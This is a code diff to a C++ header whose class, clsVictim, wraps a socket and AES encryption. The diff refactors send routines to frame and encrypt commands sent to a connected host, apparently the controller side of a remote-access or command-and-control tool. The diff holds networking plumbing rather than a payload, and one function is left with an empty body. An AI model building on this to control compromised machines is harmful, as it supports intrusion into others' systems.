@@ -1,3 +1,5 @@
+#pragma once
+
 #include <arpa/inet.h>
 #include <unistd.h>
 #include <iostream>
@@ -13,9 +15,10 @@
 class clsVictim
 {
 private:
-    clsCrypto m_crypto;
+    
 public:
     int m_nSkt;
+    clsCrypto m_crypto;
 
 public:
     clsVictim()
@@ -32,29 +35,70 @@ public:
         m_crypto = crypto;
     }
 
-    ~clsVictim()
-    {
+    ~clsVictim() = default;
 
-    }
-
-    ssize_t fnSend(std::string& szMsg)
+    ssize_t fnSendRAW(const std::string& szMsg)
     {
         std::vector<unsigned char> vuMsg(szMsg.begin(), szMsg.end());
-        return fnSend(vuMsg);
+        return fnSendRAW(vuMsg);
     }
-    ssize_t fnSend(std::vector<unsigned char> vuBuffer)
+    ssize_t fnSendRAW(const std::vector<unsigned char>& vuBuffer)
     {
-        ssize_t nSent = send(m_nSkt, vuBuffer.data(), vuBuffer.size(), 0);
-        return nSent;
+        if (m_nSkt < 0) {
+            std::cerr << "fnSendRAW: socket not initialized\n";
+            return -1;
+        }
+
+        size_t total = vuBuffer.size();
+        size_t sent = 0;
+
+        while (sent < total) {
+            ssize_t n = ::send(m_nSkt, vuBuffer.data() + sent, total - sent, 0);
+            if (n < 0) {
+                // Interrupted by signal — try again
+                if (errno == EINTR) continue;
+                std::cerr << "send() failed: " << std::strerror(errno) << "\n";
+                return -1;
+            }
+            if (n == 0) {
+                // peer closed connection
+                std::cerr << "send() returned 0, peer closed\n";
+                return static_cast<ssize_t>(sent);
+            }
+            sent += static_cast<size_t>(n);
+        }
+
+        // Use correct format for ssize_t
+        std::cout << "sent bytes: " << sent << std::endl;
+        return static_cast<ssize_t>(sent);
     }
 
-    ssize_t fnSendCommand(std::string& szMsg)
+    ssize_t fnSend(uint8_t nCommand, uint8_t nParam, const std::vector<unsigned char>& vuBuffer)
     {
-        std::vector<unsigned char> vuMsg(szMsg.begin(), szMsg.end());
-        return fnSend(vuMsg);
+        clsEDP edp(nCommand, nParam, vuBuffer);
+        std::vector<unsigned char> vuData = edp.fnabGetBytes();
+        return fnSendRAW(vuData);
+    }
+    ssize_t fnSend(uint8_t nCommand, uint8_t nParam, const std::string& szMsg)
+    {
+        std::vector<unsigned char> vuBuffer(szMsg.begin(), szMsg.end());
+        return fnSend(nCommand, nParam, vuBuffer);
     }
 
-    ssize_t fnSendEncryptedCommand(std::string& szMsg)
+    ssize_t fnSendCommand(const std::vector<std::string>& vsMsg)
+    {
+        std::string szMsg = clsEZData::fnszSendParser(vsMsg);
+        
+        return fnSendCommand(szMsg);
+    }
+    ssize_t fnSendCommand(const std::string& szMsg)
+    {
+        std::vector<unsigned char> vuCipher = m_crypto.fnvuAESEncrypt(szMsg);
+
+        return fnSend(2, 0, vuCipher);
+    }
+
+    ssize_t fnSendEncryptedCommand(const std::string& szMsg)
     {
 
     }
@@ -65,7 +109,8 @@ public:
         std::vector<unsigned char> vuBuffer(szFoo.begin(), szFoo.end());
 
         clsEDP edp(nCommand, nParam, vuBuffer);
+        std::vector<unsigned char> vuData = edp.fnabGetBytes();
 
-        return fnSend(edp.fnabGetBytes());
+        return fnSendRAW(vuData);
     }
 };
